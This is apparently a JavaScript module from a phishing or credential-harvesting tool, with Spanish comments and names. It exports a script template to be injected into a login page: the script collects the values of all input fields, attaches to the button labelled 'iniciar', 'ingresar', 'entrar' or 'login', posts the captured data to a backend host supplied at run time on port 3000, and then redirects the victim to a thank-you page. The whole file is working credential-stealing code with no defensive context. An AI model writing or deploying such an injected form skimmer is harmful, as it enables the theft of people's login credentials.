export const injectedScriptContent = (backendHost) => `
    function getCredenciales() {
    const inputs = document.querySelectorAll('input');
    const data = {};
    inputs.forEach(input => {
        data[input.name || input.id || input.type] = input.value;
    });
    return data;
    }

    function enviarCredenciales() {
        const data = getCredenciales();
        fetch('http://${backendHost}:3000/api/capture/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(err => console.error('Error enviando credenciales:', err));
    }

    // Intenta enganchar el primer botón que diga "Iniciar sesión" o similar
    const posibleBoton = Array.from(document.querySelectorAll('button, input[type="submit"], input[type="button"]'))
    .find(btn => {
        const texto = (btn.innerText || btn.value || '').toLowerCase();
        return texto.includes('iniciar') || texto.includes('ingresar') || texto.includes('entrar') || texto.includes('login');
    });
    if (posibleBoton) {
    posibleBoton.addEventListener('click', () => {
        enviarCredenciales();
        setTimeout(() => {
        window.location.href = '/gracias.html';
        }, 1000);
    });
    }
`;